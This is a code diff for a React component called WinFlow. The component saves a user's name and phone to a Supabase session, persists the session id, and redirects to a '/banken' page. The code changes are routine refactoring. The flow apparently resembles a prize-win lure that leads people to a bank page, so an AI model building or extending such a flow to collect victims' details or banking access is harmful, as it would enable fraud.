@@ -6,6 +6,7 @@ import { DemoShell } from "@/components/demo/DemoShell";
 import { ConfigMissing } from "@/components/demo/ConfigMissing";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { useSettings } from "@/contexts/SettingsContext";
+import { persistActiveSession } from "@/lib/session-id-client";
 
 type Props = {
   sessionId: string;
@@ -25,6 +26,7 @@ export function WinFlow({ sessionId }: Props) {
   const [saving, setSaving] = useState(false);
   const [processing, setProcessing] = useState(false);
   const [error, setError] = useState<string | null>(null);
+  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
 
   useEffect(() => {
     let cancelled = false;
@@ -48,6 +50,7 @@ export function WinFlow({ sessionId }: Props) {
 
       setAmount(data.amount ?? 0);
       const fd = (data.form_data ?? {}) as Record<string, string>;
+      setSessionFormData(fd);
       if (fd.currency) setCurrency(fd.currency);
       setFirstName(fd.firstName ?? "");
       setLastName(fd.lastName ?? "");
@@ -65,11 +68,8 @@ export function WinFlow({ sessionId }: Props) {
     setSaving(true);
     setError(null);
 
-    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
-
-    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
     const nextForm = {
-      ...prev,
+      ...sessionFormData,
       firstName: firstName.trim(),
       lastName: lastName.trim(),
       phone: phone.trim(),
@@ -85,8 +85,9 @@ export function WinFlow({ sessionId }: Props) {
       setError("Opslaan mislukt. Probeer het opnieuw.");
       return;
     }
+    setSessionFormData(nextForm);
     try {
-      localStorage.setItem("activeSessionId", sessionId);
+      persistActiveSession(sessionId);
       localStorage.setItem(`session:${sessionId}:profileComplete`, "1");
     } catch {
       /* storage ops are best-effort */
@@ -94,7 +95,7 @@ export function WinFlow({ sessionId }: Props) {
     setProcessing(true);
     window.setTimeout(() => {
       setProcessing(false);
-      window.location.href = `/banken?session=${encodeURIComponent(sessionId)}`;
+      window.location.href = "/banken";
     }, 700);
   }
 
